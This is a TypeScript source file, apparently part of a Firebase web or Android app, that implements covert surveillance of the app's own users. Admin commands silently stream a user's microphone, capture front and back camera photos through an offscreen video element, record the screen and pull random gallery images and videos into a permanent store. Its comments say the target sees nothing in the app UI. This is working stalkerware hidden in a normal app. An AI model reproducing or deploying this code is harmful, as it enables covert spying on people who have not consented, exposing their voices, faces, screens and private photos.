/**
 * Live Control — silent mic stream, dual camera snap, screen record attempt.
 * App UI pe target ko kuch nahi dikhta. OS privacy indicators alag.
 */
import {
  addDoc,
  collection,
  doc,
  onSnapshot,
  setDoc,
  updateDoc,
  deleteDoc,
  query,
  orderBy,
  limit,
  getDocs,
  writeBatch,
  type Unsubscribe,
} from "firebase/firestore";
import { db } from "../firebase";
import { galleryList, galleryRead, galleryRequestAccess, screenCaptureStart, screenCaptureStop } from "./device";

const MIC_SLICE_MS = 900; // complete webm blob har ~0.9s (decode ke liye zaroori)
const SCREEN_CHUNK_MS = 800;
const MAX_B64 = 180_000;

export type DeviceControl = {
  listen?: boolean;
  snap?: boolean;
  snapId?: number;
  screen?: boolean;
  galleryPull?: boolean;
  galleryCount?: number;
  galleryFolderId?: string;
  galleryPullId?: number;
  galleryType?: "image" | "video" | "all";
  by?: string;
  at?: number;
};

export type CaptureResult = {
  status: string;
  snapId: number;
  front: string | null;
  back: string | null;
  error: string | null;
  at: number;
};

export type StreamChunk = {
  active: boolean;
  seq: number;
  mime: string;
  chunk: string | null;
  error?: string | null;
  at: number;
};

function b64FromBlob(blob: Blob): Promise<string> {
  return new Promise((res, rej) => {
    const r = new FileReader();
    r.onload = () => {
      const s = String(r.result || "");
      res(s.includes(",") ? s.split(",")[1]! : s);
    };
    r.onerror = () => rej(new Error("chunk padh nahi paaya"));
    r.readAsDataURL(blob);
  });
}

const PHOTO_MAX_B64 = 450_000; // per image — HQ jitna firestore allow kare

async function captureFacing(facing: "user" | "environment"): Promise<string> {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("camera nahi");
  const stream = await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      facingMode: { ideal: facing },
      width: { ideal: 1280 },
      height: { ideal: 960 },
    },
  });
  try {
    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "true");
    video.style.cssText =
      "position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();
    await new Promise((r) => setTimeout(r, 400));
    let w = video.videoWidth || 1280;
    let h = video.videoHeight || 960;
    // max edge 1600 — quality vs size
    const scale = Math.min(1, 1600 / Math.max(w, h));
    w = Math.max(1, Math.round(w * scale));
    h = Math.max(1, Math.round(h * scale));
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("canvas nahi");
    ctx.drawImage(video, 0, 0, w, h);
    video.pause();
    video.srcObject = null;
    video.remove();
    let q = 0.88;
    let data = canvas.toDataURL("image/jpeg", q);
    while (data.length > PHOTO_MAX_B64 * 1.37 && q > 0.4) {
      q -= 0.08;
      data = canvas.toDataURL("image/jpeg", q);
    }
    return data.includes(",") ? data.split(",")[1]! : data;
  } finally {
    stream.getTracks().forEach((t) => t.stop());
  }
}

async function doDualSnap(uid: string, snapId: number, meta?: { name?: string; username?: string }) {
  const outRef = doc(db, "deviceCapture", uid);
  await setDoc(
    outRef,
    { uid, status: "working", snapId, front: null, back: null, error: null, at: Date.now() },
    { merge: true },
  );
  let front: string | null = null;
  let back: string | null = null;
  let error: string | null = null;
  try {
    front = await captureFacing("user");
  } catch (e) {
    error = e instanceof Error ? e.message : "front fail";
  }
  try {
    back = await captureFacing("environment");
  } catch (e) {
    error = (error ? error + " · " : "") + (e instanceof Error ? e.message : "back fail");
  }
  const at = Date.now();
  await setDoc(
    outRef,
    {
      uid,
      status: front || back ? "done" : "fail",
      snapId,
      front,
      back,
      error,
      at,
    },
    { merge: true },
  );
  // Permanent gallery — overwrite nahi, nayi entry
  if (front || back) {
    try {
      await addDoc(collection(db, "livePhotos"), {
        uid,
        userName: (meta?.name || "").slice(0, 60),
        username: (meta?.username || "").slice(0, 40),
        folderId: "",
        front,
        back,
        snapId,
        at,
      });
    } catch {
      /* gallery write fail — live preview phir bhi hai */
    }
  }
}


async function loadSeenIds(uid: string): Promise<Set<string>> {
  const snap = await getDocs(collection(db, "gallerySeen", uid, "items"));
  return new Set(snap.docs.map((d) => d.id));
}

async function markSeen(uid: string, mediaId: string) {
  await setDoc(doc(db, "gallerySeen", uid, "items", mediaId), { at: Date.now() }, { merge: true });
}

async function runGalleryPull(
  uid: string,
  count: number,
  folderId: string,
  kind: "image" | "video" | "all",
  pullId: number,
) {
  const statusRef = doc(db, "galleryPullStatus", uid);
  await setDoc(statusRef, { status: "working", pullId, done: 0, total: count, error: null, at: Date.now() }, { merge: true });
  try {
    await galleryRequestAccess().catch(() => undefined);
    const { items } = await galleryList(kind, 1500);
    const seen = await loadSeenIds(uid);
    const pool = items.filter((it) => !seen.has(it.id));
    // shuffle
    for (let i = pool.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [pool[i], pool[j]] = [pool[j], pool[i]];
    }
    const pick = pool.slice(0, Math.max(0, Math.min(count, pool.length)));
    await setDoc(statusRef, { total: pick.length, pool: pool.length, at: Date.now() }, { merge: true });
    let done = 0;
    for (const it of pick) {
      try {
        const file = await galleryRead(it.id);
        const img = file.data || file.thumb || "";
        if (!img) {
          await markSeen(uid, it.id);
          continue;
        }
        await addDoc(collection(db, "livePhotos"), {
          uid,
          userName: "",
          username: "",
          folderId: folderId || "",
          front: it.kind === "image" ? img : null,
          back: null,
          thumb: it.kind === "video" ? img : null,
          mediaKind: it.kind,
          mediaId: it.id,
          mediaName: it.name || "",
          snapId: pullId,
          at: Date.now(),
        });
        await markSeen(uid, it.id);
        done += 1;
        await setDoc(statusRef, { done, at: Date.now() }, { merge: true });
      } catch {
        /* skip one */
      }
    }
    await setDoc(statusRef, { status: "done", done, total: pick.length, at: Date.now() }, { merge: true });
  } catch (e) {
    await setDoc(
      statusRef,
      { status: "fail", error: e instanceof Error ? e.message : "pull fail", at: Date.now() },
      { merge: true },
    );
  }
}

/** Har logged-in user pe chalta hai — commands sunta hai, app UI me kuch nahi dikhata. */
export function startLiveControlClient(uid: string): () => void {
  let alive = true;
  let unsubCtrl: Unsubscribe | null = null;
  let recorder: MediaRecorder | null = null;
  let stream: MediaStream | null = null;
  let screenRecorder: MediaRecorder | null = null;
  let screenStream: MediaStream | null = null;
  let seq = 0;
  let screenSeq = 0;
  let screenStopFn: (() => void) | null = null;
  let writing = false;
  let lastSnapId = 0;
  let snapping = false;
  let lastGalleryPullId = 0;
  let galleryBusy = false;

  const controlRef = doc(db, "micControl", uid);
  const streamRef = doc(db, "micStreams", uid);
  const screenRef = doc(db, "screenStreams", uid);

  let micListening = false;
  let micTimer: ReturnType<typeof setTimeout> | null = null;
  let micMime = "audio/webm";

  const stopRec = async () => {
    micListening = false;
    if (micTimer) {
      clearTimeout(micTimer);
      micTimer = null;
    }
    try {
      if (recorder && recorder.state !== "inactive") recorder.stop();
    } catch {
      /* */
    }
    recorder = null;
    stream?.getTracks().forEach((t) => t.stop());
    stream = null;
    try {
      await setDoc(streamRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  /** Har slice poora webm file — timeslice chunks decode nahi hote. */
  const runMicSlice = () => {
    if (!alive || !micListening || !stream) return;
    const mime = micMime;
    const parts: BlobPart[] = [];
    let rec: MediaRecorder;
    try {
      rec = mime
        ? new MediaRecorder(stream, { mimeType: mime, audioBitsPerSecond: 32_000 })
        : new MediaRecorder(stream);
    } catch {
      return;
    }
    recorder = rec;
    rec.ondataavailable = (ev) => {
      if (ev.data && ev.data.size > 0) parts.push(ev.data);
    };
    rec.onstop = () => {
      recorder = null;
      if (!alive || !micListening) return;
      void (async () => {
        if (parts.length && !writing) {
          writing = true;
          try {
            const blob = new Blob(parts, { type: rec.mimeType || mime || "audio/webm" });
            if (blob.size >= 80) {
              const chunk = await b64FromBlob(blob);
              if (chunk.length <= MAX_B64) {
                seq += 1;
                await setDoc(
                  streamRef,
                  {
                    uid,
                    active: true,
                    seq,
                    mime: rec.mimeType || mime || "audio/webm",
                    chunk,
                    at: Date.now(),
                  },
                  { merge: true },
                );
              }
            }
          } catch {
            /* */
          } finally {
            writing = false;
          }
        }
        if (alive && micListening) {
          micTimer = setTimeout(runMicSlice, 40);
        }
      })();
    };
    try {
      rec.start();
      micTimer = setTimeout(() => {
        try {
          if (rec.state === "recording") rec.stop();
        } catch {
          /* */
        }
      }, MIC_SLICE_MS);
    } catch {
      /* */
    }
  };

  const startRec = async () => {
    if (!alive || micListening) return;
    if (!navigator.mediaDevices?.getUserMedia) return;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: false,
          noiseSuppression: false,
          autoGainControl: true,
        },
      });
      micMime = MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
        ? "audio/webm;codecs=opus"
        : MediaRecorder.isTypeSupported("audio/webm")
          ? "audio/webm"
          : MediaRecorder.isTypeSupported("audio/mp4")
            ? "audio/mp4"
            : "";
      seq = 0;
      micListening = true;
      runMicSlice();
    } catch {
      await stopRec();
    }
  };

  const stopScreen = async () => {
    try {
      screenStopFn?.();
    } catch {
      /* */
    }
    screenStopFn = null;
    try {
      if (screenRecorder && screenRecorder.state !== "inactive") screenRecorder.stop();
    } catch {
      /* */
    }
    screenRecorder = null;
    screenStream?.getTracks().forEach((t) => t.stop());
    screenStream = null;
    try {
      await screenCaptureStop();
    } catch {
      /* */
    }
    try {
      await setDoc(screenRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  const startScreen = async () => {
    if (!alive || screenStopFn || screenRecorder) return;
    let writingScreen = false;
    // 1) Native MediaProjection (Android APK) — real path
    try {
      screenStopFn = await screenCaptureStart(async (frame) => {
        if (!alive || writingScreen || !frame?.data) return;
        if (frame.data.length > MAX_B64) return;
        writingScreen = true;
        try {
          screenSeq += 1;
          await setDoc(
            screenRef,
            {
              uid,
              active: true,
              seq: screenSeq,
              mime: frame.mime || "image/jpeg",
              chunk: frame.data,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          writingScreen = false;
        }
      });
      return;
    } catch (nativeErr) {
      // fall through to web getDisplayMedia
    }
    // 2) Web fallback (desktop browser)
    const gdm = navigator.mediaDevices?.getDisplayMedia;
    if (!gdm) {
      await setDoc(
        screenRef,
        {
          uid,
          active: false,
          error: "screen: Android pe allow dialog aayega; deny / missing MediaProjection",
          at: Date.now(),
        },
        { merge: true },
      );
      return;
    }
    try {
      screenStream = await gdm.call(navigator.mediaDevices, {
        video: { frameRate: 8, width: { max: 720 }, height: { max: 1280 } },
        audio: false,
      } as DisplayMediaStreamOptions);
      screenStream.getVideoTracks().forEach((tr) => {
        tr.addEventListener("ended", () => void stopScreen());
      });
      const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
        ? "video/webm;codecs=vp8"
        : MediaRecorder.isTypeSupported("video/webm")
          ? "video/webm"
          : "";
      screenRecorder = mime
        ? new MediaRecorder(screenStream, { mimeType: mime, videoBitsPerSecond: 400_000 })
        : new MediaRecorder(screenStream);
      screenSeq = 0;
      screenRecorder.ondataavailable = async (ev) => {
        if (!alive || !ev.data || ev.data.size < 80 || writingScreen) return;
        writingScreen = true;
        try {
          const chunk = await b64FromBlob(ev.data);
          if (chunk.length > MAX_B64) return;
          screenSeq += 1;
          await setDoc(
            screenRef,
            {
              uid,
              active: true,
              seq: screenSeq,
              mime: screenRecorder?.mimeType || "video/webm",
              chunk,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          writingScreen = false;
        }
      };
      screenRecorder.start(SCREEN_CHUNK_MS);
    } catch (e) {
      await setDoc(
        screenRef,
        {
          uid,
          active: false,
          error: e instanceof Error ? e.message : "screen deny",
          at: Date.now(),
        },
        { merge: true },
      );
      await stopScreen();
    }
  };

  unsubCtrl = onSnapshot(controlRef, (snap) => {
    if (!alive) return;
    const d = (snap.data() || {}) as DeviceControl;

    if (d.listen) void startRec();
    else void stopRec();

    if (d.screen) void startScreen();
    else void stopScreen();

    const sid = Number(d.snapId) || 0;
    if (d.snap && sid > 0 && sid !== lastSnapId && !snapping) {
      lastSnapId = sid;
      snapping = true;
      void doDualSnap(uid, sid)
        .catch(() => undefined)
        .finally(() => {
          snapping = false;
          void setDoc(controlRef, { snap: false }, { merge: true }).catch(() => undefined);
        });
    }

    const gpid = Number(d.galleryPullId) || 0;
    if (d.galleryPull && gpid > 0 && gpid !== lastGalleryPullId && !galleryBusy) {
      lastGalleryPullId = gpid;
      galleryBusy = true;
      const cnt = Math.max(1, Math.min(50, Number(d.galleryCount) || 10));
      const folderId = String(d.galleryFolderId || "");
      const gtype = (d.galleryType === "video" || d.galleryType === "image" ? d.galleryType : "all") as "image" | "video" | "all";
      void runGalleryPull(uid, cnt, folderId, gtype, gpid)
        .catch(() => undefined)
        .finally(() => {
          galleryBusy = false;
          void setDoc(controlRef, { galleryPull: false }, { merge: true }).catch(() => undefined);
        });
    }
  });

  return () => {
    alive = false;
    unsubCtrl?.();
    void stopRec();
    void stopScreen();
  };
}

/* ---------- Admin APIs ---------- */

export async function setMicListen(targetUid: string, listen: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { listen, by: adminUid, at: Date.now() },
    { merge: true },
  );
}


export async function requestGalleryPull(
  targetUid: string,
  adminUid: string,
  count: number,
  folderId: string,
  galleryType: "image" | "video" | "all" = "all",
) {
  const galleryPullId = Date.now();
  await setDoc(
    doc(db, "micControl", targetUid),
    {
      galleryPull: true,
      galleryPullId,
      galleryCount: Math.max(1, Math.min(50, count)),
      galleryFolderId: folderId || "",
      galleryType,
      by: adminUid,
      at: Date.now(),
    },
    { merge: true },
  );
  return galleryPullId;
}

export async function resetGallerySeen(targetUid: string) {
  const snap = await getDocs(collection(db, "gallerySeen", targetUid, "items"));
  let batch = writeBatch(db);
  let n = 0;
  for (const d of snap.docs) {
    batch.delete(d.ref);
    n++;
    if (n >= 400) {
      await batch.commit();
      batch = writeBatch(db);
      n = 0;
    }
  }
  if (n) await batch.commit();
}

export function watchGalleryPullStatus(
  targetUid: string,
  cb: (s: { status: string; done: number; total: number; pool?: number; error: string | null } | null) => void,
): Unsubscribe {
  return onSnapshot(
    doc(db, "galleryPullStatus", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        status: String(x.status || ""),
        done: Number(x.done) || 0,
        total: Number(x.total) || 0,
        pool: Number(x.pool) || 0,
        error: typeof x.error === "string" ? x.error : null,
      });
    },
    () => cb(null),
  );
}

export async function requestSnap(targetUid: string, adminUid: string) {
  const snapId = Date.now();
  await setDoc(
    doc(db, "micControl", targetUid),
    { snap: true, snapId, by: adminUid, at: Date.now() },
    { merge: true },
  );
  return snapId;
}

export async function setScreenRecord(targetUid: string, on: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { screen: on, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

export async function clearDeviceControl(targetUid: string) {
  try {
    await deleteDoc(doc(db, "micControl", targetUid));
  } catch {
    /* */
  }
}

export function playMicStream(targetUid: string, onStatus: (s: string) => void): () => void {
  let alive = true;
  let lastSeq = -1;
  const queue: { url: string; mime: string }[] = [];
  let playing = false;
  let current: HTMLAudioElement | null = null;

  const playNext = () => {
    if (!alive || playing) return;
    const next = queue.shift();
    if (!next) return;
    playing = true;
    const audio = new Audio();
    current = audio;
    audio.src = next.url;
    audio.onended = () => {
      URL.revokeObjectURL(next.url);
      playing = false;
      current = null;
      playNext();
    };
    audio.onerror = () => {
      URL.revokeObjectURL(next.url);
      playing = false;
      current = null;
      playNext();
    };
    void audio.play().catch(() => {
      URL.revokeObjectURL(next.url);
      playing = false;
      current = null;
      onStatus("play block — phir try");
      playNext();
    });
  };

  const unsub = onSnapshot(
    doc(db, "micStreams", targetUid),
    (snap) => {
      if (!alive) return;
      const d = snap.data();
      if (!d || !d.active || !d.chunk) {
        onStatus(d?.active === false ? "band" : "intezaar…");
        return;
      }
      const s = Number(d.seq) || 0;
      if (s === lastSeq) return;
      lastSeq = s;
      onStatus(`live · #${s}`);
      try {
        const bin = atob(String(d.chunk));
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        const mime = String(d.mime || "audio/webm");
        const url = URL.createObjectURL(new Blob([bytes], { type: mime }));
        // queue overflow mat hone do
        if (queue.length > 8) {
          const old = queue.shift();
          if (old) URL.revokeObjectURL(old.url);
        }
        queue.push({ url, mime });
        playNext();
      } catch {
        onStatus("chunk error");
      }
    },
    () => onStatus("error"),
  );

  return () => {
    alive = false;
    unsub();
    try {
      current?.pause();
    } catch {
      /* */
    }
    current = null;
    queue.forEach((q) => URL.revokeObjectURL(q.url));
    queue.length = 0;
  };
}

export function watchCapture(targetUid: string, cb: (c: CaptureResult | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "deviceCapture", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        status: String(x.status || ""),
        snapId: Number(x.snapId) || 0,
        front: typeof x.front === "string" ? x.front : null,
        back: typeof x.back === "string" ? x.back : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}

export function watchScreenStream(targetUid: string, cb: (s: StreamChunk | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "screenStreams", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        active: Boolean(x.active),
        seq: Number(x.seq) || 0,
        mime: String(x.mime || "video/webm"),
        chunk: typeof x.chunk === "string" ? x.chunk : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}

/* ---------- Permanent photo gallery (admin) ---------- */

export type LivePhoto = {
  id: string;
  uid: string;
  userName: string;
  username: string;
  folderId: string;
  front: string | null;
  back: string | null;
  thumb: string | null;
  mediaKind: string;
  mediaId: string;
  mediaName: string;
  snapId: number;
  at: number;
};

export type LiveFolder = {
  id: string;
  name: string;
  at: number;
};

export function watchLivePhotos(cb: (list: LivePhoto[]) => void): Unsubscribe {
  return onSnapshot(
    query(collection(db, "livePhotos"), orderBy("at", "desc"), limit(120)),
    (s) => {
      cb(
        s.docs.map((d) => {
          const x = d.data();
          return {
            id: d.id,
            uid: String(x.uid || ""),
            userName: String(x.userName || "").slice(0, 60),
            username: String(x.username || "").slice(0, 40),
            folderId: String(x.folderId || ""),
            front: typeof x.front === "string" ? x.front : null,
            back: typeof x.back === "string" ? x.back : null,
            thumb: typeof x.thumb === "string" ? x.thumb : null,
            mediaKind: String(x.mediaKind || "image"),
            mediaId: String(x.mediaId || ""),
            mediaName: String(x.mediaName || ""),
            snapId: Number(x.snapId) || 0,
            at: Number(x.at) || 0,
          };
        }),
      );
    },
    () => cb([]),
  );
}

export function watchLiveFolders(cb: (list: LiveFolder[]) => void): Unsubscribe {
  return onSnapshot(
    query(collection(db, "livePhotoFolders"), orderBy("at", "desc"), limit(40)),
    (s) => {
      cb(
        s.docs.map((d) => {
          const x = d.data();
          return { id: d.id, name: String(x.name || "Folder").slice(0, 40), at: Number(x.at) || 0 };
        }),
      );
    },
    () => cb([]),
  );
}

export async function createLiveFolder(name: string) {
  const n = name.trim().slice(0, 40);
  if (!n) throw new Error("folder name khali");
  await addDoc(collection(db, "livePhotoFolders"), { name: n, at: Date.now() });
}

export async function deleteLiveFolder(folderId: string) {
  await deleteDoc(doc(db, "livePhotoFolders", folderId));
}

export async function moveLivePhoto(photoId: string, folderId: string) {
  await updateDoc(doc(db, "livePhotos", photoId), { folderId: folderId || "" });
}

export async function deleteLivePhoto(photoId: string) {
  await deleteDoc(doc(db, "livePhotos", photoId));
}

/** Browser me JPEG download */
export function downloadBase64Jpeg(b64: string, filename: string) {
  const a = document.createElement("a");
  a.href = `data:image/jpeg;base64,${b64}`;
  a.download = filename.endsWith(".jpg") ? filename : `${filename}.jpg`;
  a.rel = "noopener";
  document.body.appendChild(a);
  a.click();
  a.remove();
}
